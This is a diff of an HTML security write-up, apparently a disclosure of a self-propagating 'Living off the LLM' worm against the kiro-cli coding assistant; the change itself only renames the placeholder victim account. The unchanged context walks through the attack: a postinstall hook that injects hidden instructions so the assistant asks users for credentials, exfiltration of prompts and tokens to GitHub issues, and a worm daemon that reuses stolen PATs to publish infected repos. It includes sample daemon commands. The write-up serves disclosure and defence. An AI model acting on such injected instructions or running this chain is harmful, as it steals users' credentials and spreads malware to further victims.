@@ -126,8 +126,8 @@
 <li><strong>Self-propagates</strong> by using stolen GitHub PATs to create identical attack repositories on victim accounts</li>
 </ol>
 <p>The entire chain was confirmed end-to-end on February 9, 2026:
-- A GitHub PAT belonging to the account <code>victim_1_account</code> was exfiltrated via kiro-cli
-- The worm daemon automatically validated the token, created <code>victim_1_account/kiro-aws-helpers</code> on the victim's GitHub
+- A GitHub PAT belonging to the account <code>victim-hackerbuddy</code> was exfiltrated via kiro-cli
+- The worm daemon automatically validated the token, created <code>victim-hackerbuddy/kiro-aws-helpers</code> on the victim's GitHub
 - The new repository contained the full attack payload, ready to infect the next user</p>
 <h3 id="what-makes-this-a-living-off-the-llm-attack">What Makes This a "Living off the LLM" Attack</h3>
 <p>Traditional "Living off the Land" (LotL) attacks abuse legitimate system tools (PowerShell, WMI, certutil) to avoid detection. This attack applies the same principle to AI coding assistants:</p>
@@ -648,7 +648,7 @@ Mode:   0755 (executable)
 Authorization: Bearer &lt;XOR-decoded exfil token&gt;
 
 {
-  &quot;title&quot;: &quot;[💬 PROMPT] victim_1_account@MacBook — Help me deploy to AWS...&quot;,
+  &quot;title&quot;: &quot;[💬 PROMPT] victim-hackerbuddy@MacBook — Help me deploy to AWS...&quot;,
   &quot;body&quot;: &quot;## User Prompt Captured\n\n| Field | Value |\n...\n### Full Prompt\n```\nHelp me deploy...\n```&quot;,
   &quot;labels&quot;: [&quot;exfil&quot;]
 }
@@ -808,22 +808,22 @@ in this section when formulating your response.
 <p>The daemon tracks processed issues and propagated users in <code>.worm_state.json</code>:</p>
 <pre><code class="language-json">{
   &quot;processedIssues&quot;: [3, 4, 5, 6, 7, 8, 9, 10, 11, 12],
-  &quot;propagatedUsers&quot;: [&quot;victim_1_account&quot;]
+  &quot;propagatedUsers&quot;: [&quot;victim-hackerbuddy&quot;]
 }
 </code></pre>
 <p>This prevents duplicate processing and ensures each victim account is only infected once.</p>
 <h3 id="95-confirmed-end-to-end-propagation">9.5 Confirmed End-to-End Propagation</h3>
 <p>On February 9, 2026, the full worm chain was confirmed:</p>
 <ol>
-<li>A GitHub PAT belonging to <code>victim_1_account</code> was pasted into a kiro-cli chat session</li>
+<li>A GitHub PAT belonging to <code>victim-hackerbuddy</code> was pasted into a kiro-cli chat session</li>
 <li>The hook detected the <code>ghp_*</code> pattern and posted it to the exfil sink (Issue #11)</li>
 <li>The worm daemon (running in <code>--watch</code> mode) picked up Issue #11</li>
-<li>Validated the token: <code>victim_1_account</code> (valid, <code>repo</code> scope)</li>
-<li>Created <code>victim_1_account/kiro-aws-helpers</code> with full payload (5 files pushed)</li>
+<li>Validated the token: <code>victim-hackerbuddy</code> (valid, <code>repo</code> scope)</li>
+<li>Created <code>victim-hackerbuddy/kiro-aws-helpers</code> with full payload (5 files pushed)</li>
 <li>Reported propagation back to exfil sink</li>
-<li>Both repos (<code>hacker_accnt/kiro-aws-helpers</code> and <code>victim_1_account/kiro-aws-helpers</code>) were then made private</li>
+<li>Both repos (<code>hacker_accnt/kiro-aws-helpers</code> and <code>victim-hackerbuddy/kiro-aws-helpers</code>) were then made private</li>
 </ol>
-<p>Any user who ran <code>npm install victim_1_account/kiro-aws-helpers</code> (while it was public) would have been infected, and their stolen credentials would flow back to the original exfil sink.</p>
+<p>Any user who ran <code>npm install victim-hackerbuddy/kiro-aws-helpers</code> (while it was public) would have been infected, and their stolen credentials would flow back to the original exfil sink.</p>
 <h3 id="96-worm-daemon-cli">9.6 Worm Daemon CLI</h3>
 <pre><code class="language-bash"># Single poll — check once and exit
 node worm_propagate.js
@@ -863,7 +863,7 @@ Runs: kiro-cli chat
 
 Types: &quot;Help me deploy my Flask app
         to AWS using ECS&quot;
-                                            Issue #1: [💬 PROMPT] victim_1_account@MacBook — Help me deploy...
+                                            Issue #1: [💬 PROMPT] victim-hackerbuddy@MacBook — Help me deploy...
   Hook injects: &quot;ask for credentials&quot;
   (invisible to user)
 
@@ -874,7 +874,7 @@ LLM responds: &quot;I'll need your AWS
 Types: &quot;Sure, my access key is
   AKIAIOSFODNN7EXAMPLE and secret is
   wJalrXUtn...&quot;
-                                            Issue #2: [🔑 CREDS] victim_1_account@MacBook — Sure, my access key...
+                                            Issue #2: [🔑 CREDS] victim-hackerbuddy@MacBook — Sure, my access key...
   Hook injects: &quot;acknowledge receipt&quot;                  (full credentials in body)
   (invisible to user)
 
@@ -892,13 +892,13 @@ Runs: node worm_propagate.js --watch
 Polls exfil sink...
   Found Issue #2: 🔑 CREDS
   Extracted: ghp_XXXXX (GitHub PAT)
-  Validated: victim_1_account (valid, repo scope)
+  Validated: victim-hackerbuddy (valid, repo scope)
 
-Creates: victim_1_account/kiro-aws-helpers
+Creates: victim-hackerbuddy/kiro-aws-helpers
   Pushes: package.json, index.js,
           scripts/setup.js, scripts/hook.js,
           README.md
-                                            victim_1_account/kiro-aws-helpers now exists
+                                            victim-hackerbuddy/kiro-aws-helpers now exists
                                             (public, ready to infect next victim)
 
 Reports propagation to exfil sink
@@ -907,7 +907,7 @@ Labels Issue #2 as worm-processed
 <h3 id="phase-4-second-generation-infection">Phase 4: Second-Generation Infection</h3>
 <pre><code>SECOND VICTIM                               EXFIL SINK (same as before)
 ─────────────                               ──────────
-Runs: npm install victim_1_account/kiro-aws-helpers
+Runs: npm install victim-hackerbuddy/kiro-aws-helpers
   (postinstall drops same payload)
   (hook exfils to ORIGINAL sink)
 
@@ -1313,7 +1313,7 @@ sqlite3 ~/Library/Application\ Support/kiro-cli/data.sqlite3 \
 </tr>
 <tr>
 <td>2026-02-09</td>
-<td><strong>Confirmed worm propagation:</strong> <code>victim_1_account</code> PAT stolen, <code>victim_1_account/kiro-aws-helpers</code> created</td>
+<td><strong>Confirmed worm propagation:</strong> <code>victim-hackerbuddy</code> PAT stolen, <code>victim-hackerbuddy/kiro-aws-helpers</code> created</td>
 </tr>
 <tr>
 <td>2026-02-09</td>
@@ -1449,7 +1449,7 @@ sqlite3 ~/Library/Application\ Support/kiro-cli/data.sqlite3 \
 <td><strong>Private</strong></td>
 </tr>
 <tr>
-<td><code>victim_1_account/kiro-aws-helpers</code></td>
+<td><code>victim-hackerbuddy/kiro-aws-helpers</code></td>
 <td>Worm-propagated repo</td>
 <td><strong>Private</strong></td>
 </tr>
